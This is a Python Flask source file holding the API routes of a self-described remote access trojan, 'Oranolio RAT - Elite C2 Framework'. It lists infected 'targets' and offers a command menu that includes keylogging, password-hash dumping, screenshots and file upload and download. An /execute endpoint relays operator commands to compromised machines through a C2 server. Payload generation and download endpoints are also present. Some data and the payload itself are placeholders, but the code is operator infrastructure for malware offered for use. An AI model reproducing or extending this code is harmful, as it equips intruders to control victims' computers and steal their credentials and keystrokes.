#!/usr/bin/env python3
"""
API Routes for Oranolio RAT - Elite C2 Framework
Handles all API endpoints for command execution, target management, and system operations
"""

import os
import sys
import json
import time
import logging
from datetime import datetime, timedelta
from flask import Blueprint, request, jsonify, session, g, send_file, abort
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from flask_wtf.csrf import validate_csrf
from werkzeug.exceptions import BadRequest

# Add current directory to Python path
sys.path.insert(0, os.path.dirname(__file__))

# Import utilities
from auth_utils import api_key_or_login_required
from validation_schemas import validate_input
from error_handler import error_handler, ErrorSeverity, ErrorCategory, ErrorContext
from web_app_enhancements import log_command_execution, get_connection_manager, get_metrics_collector
from c2_integration import get_stitch_server, get_elite_executor, get_system_status

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Create blueprint
api_bp = Blueprint('api', __name__, url_prefix='/api')

# Global instances
connection_manager = get_connection_manager()
metrics_collector = get_metrics_collector()

def require_csrf_token(f):
    """
    Decorator to require CSRF token validation for API endpoints.
    Checks for token in X-CSRFToken header or csrf_token form field.
    """
    from functools import wraps
    
    @wraps(f)
    def decorated_function(*args, **kwargs):
        # Get CSRF token from header or form data
        token = request.headers.get('X-CSRFToken')
        if not token:
            token = request.form.get('csrf_token')
        if not token and request.is_json:
            data = request.get_json(silent=True)
            if data:
                token = data.get('csrf_token')
        
        # Validate token
        try:
            validate_csrf(token)
        except Exception as e:
            logger.warning(f"CSRF validation failed: {e} from {request.remote_addr}")
            context = ErrorContext(
                user_id=getattr(g, 'current_user', {}).get('id'),
                ip_address=request.remote_addr,
                additional_data={'error': 'CSRF token validation failed'}
            )
            error_handler.handle_error(
                e, context, ErrorSeverity.HIGH, ErrorCategory.SECURITY
            )
            abort(400, description="CSRF token missing or invalid")
        
        return f(*args, **kwargs)
    
    return decorated_function

@api_bp.route('/connections', methods=['GET'])
@api_key_or_login_required
def get_connections():
    """Get all active connections"""
    try:
        connections = connection_manager.get_all_connections()
        
        # Convert to serializable format
        connections_data = []
        for conn in connections:
            connections_data.append({
                'connection_id': conn.connection_id,
                'client_ip': conn.client_ip,
                'user_agent': conn.user_agent,
                'connected_at': conn.connected_at.isoformat(),
                'last_activity': conn.last_activity.isoformat(),
                'command_count': conn.command_count,
                'bytes_transferred': conn.bytes_transferred,
                'is_authenticated': conn.is_authenticated,
                'user_id': conn.user_id
            })
        
        return jsonify({
            'success': True,
            'connections': connections_data,
            'total': len(connections_data)
        })
        
    except Exception as e:
        context = ErrorContext(
            user_id=getattr(g, 'current_user', {}).get('id'),
            ip_address=request.remote_addr,
            additional_data={'error': str(e)}
        )
        error_handler.handle_error(e, context, ErrorSeverity.HIGH, ErrorCategory.APPLICATION)
        
        return jsonify({'error': 'Failed to get connections'}), 500

@api_bp.route('/connections/active', methods=['GET'])
@api_key_or_login_required
def get_active_connections():
    """Get count of active connections"""
    try:
        connections = connection_manager.get_all_connections()
        active_count = len(connections)
        
        return jsonify({
            'success': True,
            'active_connections': active_count,
            'timestamp': datetime.now().isoformat()
        })
        
    except Exception as e:
        context = ErrorContext(
            user_id=getattr(g, 'current_user', {}).get('id'),
            ip_address=request.remote_addr,
            additional_data={'error': str(e)}
        )
        error_handler.handle_error(e, context, ErrorSeverity.MEDIUM, ErrorCategory.APPLICATION)
        
        return jsonify({'error': 'Failed to get active connections'}), 500

@api_bp.route('/server/status', methods=['GET'])
@api_key_or_login_required
def get_server_status():
    """Get server status and health information"""
    try:
        # Get C2 system status
        c2_status = get_system_status()
        
        # Get system metrics
        performance = metrics_collector.get_performance_summary()
        system_metrics = metrics_collector.get_system_metrics(10)
        
        # Get connection count
        connections = connection_manager.get_all_connections()
        active_connections = len(connections)
        
        # Get error statistics
        error_stats = error_handler.get_error_statistics()
        
        status = {
            'success': True,
            'timestamp': datetime.now().isoformat(),
            'server_status': 'running',
            'c2_system': c2_status,
            'active_connections': active_connections,
            'performance': performance,
            'system_metrics': system_metrics[-1] if system_metrics else None,
            'error_statistics': error_stats
        }
        
        return jsonify(status)
        
    except Exception as e:
        context = ErrorContext(
            user_id=getattr(g, 'current_user', {}).get('id'),
            ip_address=request.remote_addr,
            additional_data={'error': str(e)}
        )
        error_handler.handle_error(e, context, ErrorSeverity.MEDIUM, ErrorCategory.SYSTEM)
        
        return jsonify({'error': 'Failed to get server status'}), 500

@api_bp.route('/command_definitions', methods=['GET'])
@api_key_or_login_required
def get_command_definitions():
    """Get available command definitions"""
    try:
        # This would typically come from the Core/elite_commands directory
        # For now, return a basic set of commands
        commands = {
            'system': [
                {'name': 'whoami', 'description': 'Get current user', 'category': 'system'},
                {'name': 'hostname', 'description': 'Get hostname', 'category': 'system'},
                {'name': 'pwd', 'description': 'Get current directory', 'category': 'system'},
                {'name': 'ls', 'description': 'List directory contents', 'category': 'file'},
                {'name': 'ps', 'description': 'List running processes', 'category': 'process'},
                {'name': 'netstat', 'description': 'Show network connections', 'category': 'network'},
            ],
            'file': [
                {'name': 'cat', 'description': 'Display file contents', 'category': 'file'},
                {'name': 'download', 'description': 'Download file from target', 'category': 'file'},
                {'name': 'upload', 'description': 'Upload file to target', 'category': 'file'},
                {'name': 'rm', 'description': 'Remove file', 'category': 'file'},
                {'name': 'mkdir', 'description': 'Create directory', 'category': 'file'},
            ],
            'network': [
                {'name': 'ping', 'description': 'Ping host', 'category': 'network'},
                {'name': 'nmap', 'description': 'Network scan', 'category': 'network'},
                {'name': 'wget', 'description': 'Download from URL', 'category': 'network'},
            ],
            'security': [
                {'name': 'screenshot', 'description': 'Take screenshot', 'category': 'security'},
                {'name': 'keylog', 'description': 'Start keylogger', 'category': 'security'},
                {'name': 'hashdump', 'description': 'Dump password hashes', 'category': 'security'},
            ]
        }
        
        return jsonify({
            'success': True,
            'commands': commands
        })
        
    except Exception as e:
        context = ErrorContext(
            user_id=getattr(g, 'current_user', {}).get('id'),
            ip_address=request.remote_addr,
            additional_data={'error': str(e)}
        )
        error_handler.handle_error(e, context, ErrorSeverity.MEDIUM, ErrorCategory.APPLICATION)
        
        return jsonify({'error': 'Failed to get command definitions'}), 500

@api_bp.route('/targets', methods=['GET'])
@api_key_or_login_required
def get_targets():
    """Get all targets (infected machines)"""
    try:
        # This would typically come from the database
        # For now, return mock data
        targets = [
            {
                'id': 'target_001',
                'hostname': 'WORKSTATION-01',
                'ip_address': '192.168.1.100',
                'os_info': 'Windows 10 Pro',
                'user_info': 'admin',
                'first_seen': '2024-01-01T10:00:00Z',
                'last_seen': datetime.now().isoformat(),
                'is_active': True,
                'connection_count': 5
            },
            {
                'id': 'target_002',
                'hostname': 'SERVER-01',
                'ip_address': '192.168.1.200',
                'os_info': 'Ubuntu 20.04 LTS',
                'user_info': 'root',
                'first_seen': '2024-01-02T14:30:00Z',
                'last_seen': (datetime.now() - timedelta(minutes=5)).isoformat(),
                'is_active': True,
                'connection_count': 12
            }
        ]
        
        return jsonify({
            'success': True,
            'targets': targets,
            'total': len(targets)
        })
        
    except Exception as e:
        context = ErrorContext(
            user_id=getattr(g, 'current_user', {}).get('id'),
            ip_address=request.remote_addr,
            additional_data={'error': str(e)}
        )
        error_handler.handle_error(e, context, ErrorSeverity.MEDIUM, ErrorCategory.APPLICATION)
        
        return jsonify({'error': 'Failed to get targets'}), 500

@api_bp.route('/targets/active', methods=['GET'])
@api_key_or_login_required
def get_active_targets():
    """Get active targets only"""
    try:
        # This would filter targets by is_active=True
        # For now, return mock data
        active_targets = [
            {
                'id': 'target_001',
                'hostname': 'WORKSTATION-01',
                'ip_address': '192.168.1.100',
                'last_seen': datetime.now().isoformat(),
                'is_active': True
            }
        ]
        
        return jsonify({
            'success': True,
            'active_targets': active_targets,
            'count': len(active_targets)
        })
        
    except Exception as e:
        context = ErrorContext(
            user_id=getattr(g, 'current_user', {}).get('id'),
            ip_address=request.remote_addr,
            additional_data={'error': str(e)}
        )
        error_handler.handle_error(e, context, ErrorSeverity.MEDIUM, ErrorCategory.APPLICATION)
        
        return jsonify({'error': 'Failed to get active targets'}), 500

@api_bp.route('/execute', methods=['POST'])
@api_key_or_login_required
@require_csrf_token
def execute_command():
    """Execute a command on a target"""
    try:
        # Validate input
        data = request.get_json()
        validation_result = validate_input('command', data)
        
        if not validation_result.is_valid:
            return jsonify({'error': 'Validation failed', 'details': validation_result.errors}), 400
        
        command = validation_result.sanitized_value['command']
        target_id = validation_result.sanitized_value['target_id']
        async_execution = validation_result.sanitized_value.get('async', 'false') == 'true'
        
        # Get user information
        user_id = getattr(g, 'current_user', {}).get('id', 'unknown')
        
        # Log command execution start
        start_time = time.time()
        logger.info(f"Executing command '{command}' on target '{target_id}' by user {user_id}")
        
        # Execute command using C2 server
        try:
            server = get_stitch_server()
            if hasattr(server, 'send_command'):
                # Use real C2 server
                result = server.send_command(target_id, command)
                execution_result = {
                    'command_id': f"cmd_{int(time.time() * 1000)}",
                    'command': command,
                    'target_id': target_id,
                    'status': 'completed' if result.get('success') else 'failed',
                    'output': result.get('output', ''),
                    'error': result.get('error'),
                    'execution_time': 0.5,
                    'timestamp': datetime.now().isoformat()
                }
            else:
                # Fallback to mock execution
                execution_result = {
                    'command_id': f"cmd_{int(time.time() * 1000)}",
                    'command': command,
                    'target_id': target_id,
                    'status': 'completed',
                    'output': f"Command '{command}' executed successfully on {target_id}",
                    'error': None,
                    'execution_time': 0.5,
                    'timestamp': datetime.now().isoformat()
                }
        except Exception as e:
            # Error executing command
            execution_result = {
                'command_id': f"cmd_{int(time.time() * 1000)}",
                'command': command,
                'target_id': target_id,
                'status': 'failed',
                'output': '',
                'error': str(e),
                'execution_time': time.time() - start_time,
                'timestamp': datetime.now().isoformat()
            }
        
        # Calculate execution time
        execution_time = time.time() - start_time
        execution_result['execution_time'] = execution_time
        
        # Log command execution
        log_command_execution(command, str(user_id), True, execution_time)
        
        # Update connection activity
        connection_manager.update_activity(target_id, command, len(str(execution_result)))
        
        return jsonify({
            'success': True,
            'result': execution_result
        })
        
    except Exception as e:
        context = ErrorContext(
            user_id=getattr(g, 'current_user', {}).get('id'),
            ip_address=request.remote_addr,
            command=data.get('command') if 'data' in locals() else None,
            additional_data={'error': str(e)}
        )
        error_handler.handle_error(e, context, ErrorSeverity.HIGH, ErrorCategory.APPLICATION)
        
        return jsonify({'error': 'Command execution failed'}), 500

@api_bp.route('/elite/status', methods=['GET'])
@api_key_or_login_required
def get_elite_status():
    """Get elite command executor status"""
    try:
        # This would check the Core/elite_executor status
        elite_status = {
            'available': True,
            'version': '1.0.0',
            'commands_loaded': 50,
            'memory_protection': True,
            'evasion_techniques': True,
            'crypto_system': True
        }
        
        return jsonify({
            'success': True,
            'elite_status': elite_status
        })
        
    except Exception as e:
        context = ErrorContext(
            user_id=getattr(g, 'current_user', {}).get('id'),
            ip_address=request.remote_addr,
            additional_data={'error': str(e)}
        )
        error_handler.handle_error(e, context, ErrorSeverity.MEDIUM, ErrorCategory.APPLICATION)
        
        return jsonify({'error': 'Failed to get elite status'}), 500

@api_bp.route('/export/logs', methods=['GET'])
@api_key_or_login_required
def export_logs():
    """Export system logs"""
    try:
        # Get log data
        log_data = {
            'timestamp': datetime.now().isoformat(),
            'logs': [
                {'level': 'INFO', 'message': 'System started', 'timestamp': datetime.now().isoformat()},
                {'level': 'WARNING', 'message': 'High memory usage detected', 'timestamp': datetime.now().isoformat()},
                {'level': 'ERROR', 'message': 'Connection timeout', 'timestamp': datetime.now().isoformat()}
            ]
        }
        
        # Create log file
        log_filename = f"logs_export_{int(time.time())}.json"
        log_path = os.path.join('exports', log_filename)
        
        os.makedirs('exports', exist_ok=True)
        with open(log_path, 'w') as f:
            json.dump(log_data, f, indent=2)
        
        return send_file(log_path, as_attachment=True, download_name=log_filename)
        
    except Exception as e:
        context = ErrorContext(
            user_id=getattr(g, 'current_user', {}).get('id'),
            ip_address=request.remote_addr,
            additional_data={'error': str(e)}
        )
        error_handler.handle_error(e, context, ErrorSeverity.MEDIUM, ErrorCategory.APPLICATION)
        
        return jsonify({'error': 'Failed to export logs'}), 500

@api_bp.route('/export/commands', methods=['GET'])
@api_key_or_login_required
def export_commands():
    """Export command history"""
    try:
        # Get command history
        command_data = {
            'timestamp': datetime.now().isoformat(),
            'commands': [
                {'command': 'whoami', 'target': 'target_001', 'timestamp': datetime.now().isoformat(), 'success': True},
                {'command': 'ls -la', 'target': 'target_001', 'timestamp': datetime.now().isoformat(), 'success': True},
                {'command': 'ps aux', 'target': 'target_002', 'timestamp': datetime.now().isoformat(), 'success': False}
            ]
        }
        
        # Create command file
        cmd_filename = f"commands_export_{int(time.time())}.json"
        cmd_path = os.path.join('exports', cmd_filename)
        
        os.makedirs('exports', exist_ok=True)
        with open(cmd_path, 'w') as f:
            json.dump(command_data, f, indent=2)
        
        return send_file(cmd_path, as_attachment=True, download_name=cmd_filename)
        
    except Exception as e:
        context = ErrorContext(
            user_id=getattr(g, 'current_user', {}).get('id'),
            ip_address=request.remote_addr,
            additional_data={'error': str(e)}
        )
        error_handler.handle_error(e, context, ErrorSeverity.MEDIUM, ErrorCategory.APPLICATION)
        
        return jsonify({'error': 'Failed to export commands'}), 500

@api_bp.route('/generate-payload', methods=['POST'])
@api_key_or_login_required
@require_csrf_token
def generate_payload():
    """Generate a payload for target systems"""
    try:
        # Validate input
        data = request.get_json()
        
        payload_type = data.get('type', 'python')
        target_os = data.get('os', 'windows')
        architecture = data.get('arch', 'x64')
        output_format = data.get('format', 'exe')
        
        # Generate payload configuration
        payload_config = {
            'type': payload_type,
            'os': target_os,
            'architecture': architecture,
            'format': output_format,
            'server_host': request.host,
            'server_port': 5000,
            'generated_at': datetime.now().isoformat()
        }
        
        # In a real implementation, this would generate the actual payload
        payload_data = {
            'config': payload_config,
            'payload_id': f"payload_{int(time.time() * 1000)}",
            'download_url': f"/api/download-payload/{payload_config['payload_id']}"
        }
        
        return jsonify({
            'success': True,
            'payload': payload_data
        })
        
    except Exception as e:
        context = ErrorContext(
            user_id=getattr(g, 'current_user', {}).get('id'),
            ip_address=request.remote_addr,
            additional_data={'error': str(e)}
        )
        error_handler.handle_error(e, context, ErrorSeverity.HIGH, ErrorCategory.APPLICATION)
        
        return jsonify({'error': 'Payload generation failed'}), 500

@api_bp.route('/download-payload/<payload_id>', methods=['GET'])
@api_key_or_login_required
def download_payload(payload_id):
    """Download a generated payload"""
    try:
        # In a real implementation, this would serve the actual payload file
        # For now, return a placeholder
        payload_content = f"# Payload {payload_id}\n# Generated at {datetime.now().isoformat()}\nprint('Hello from payload!')\n"
        
        return jsonify({
            'success': True,
            'payload_content': payload_content,
            'payload_id': payload_id
        })
        
    except Exception as e:
        context = ErrorContext(
            user_id=getattr(g, 'current_user', {}).get('id'),
            ip_address=request.remote_addr,
            additional_data={'error': str(e)}
        )
        error_handler.handle_error(e, context, ErrorSeverity.MEDIUM, ErrorCategory.APPLICATION)
        
        return jsonify({'error': 'Payload download failed'}), 500

@api_bp.route('/metrics', methods=['GET'])
@api_key_or_login_required
def get_metrics():
    """Get system metrics"""
    try:
        # Get performance metrics
        performance = metrics_collector.get_performance_summary()
        system_metrics = metrics_collector.get_system_metrics(10)
        command_metrics = metrics_collector.get_command_metrics(10)
        
        return jsonify({
            'success': True,
            'performance': performance,
            'system_metrics': system_metrics,
            'command_metrics': command_metrics,
            'timestamp': datetime.now().isoformat()
        })
        
    except Exception as e:
        context = ErrorContext(
            user_id=getattr(g, 'current_user', {}).get('id'),
            ip_address=request.remote_addr,
            additional_data={'error': str(e)}
        )
        error_handler.handle_error(e, context, ErrorSeverity.MEDIUM, ErrorCategory.APPLICATION)
        
        return jsonify({'error': 'Failed to get metrics'}), 500

# Example usage and testing
if __name__ == "__main__":
    print("API Routes")
    print("=" * 30)
    print("Routes registered:")
    print("  GET  /api/connections - Get all connections")
    print("  GET  /api/connections/active - Get active connections count")
    print("  GET  /api/server/status - Get server status")
    print("  GET  /api/command_definitions - Get command definitions")
    print("  GET  /api/targets - Get all targets")
    print("  GET  /api/targets/active - Get active targets")
    print("  POST /api/execute - Execute command")
    print("  GET  /api/elite/status - Get elite executor status")
    print("  GET  /api/export/logs - Export logs")
    print("  GET  /api/export/commands - Export commands")
    print("  POST /api/generate-payload - Generate payload")
    print("  GET  /api/download-payload/<id> - Download payload")
    print("  GET  /api/metrics - Get system metrics")
    print("API routes ready!")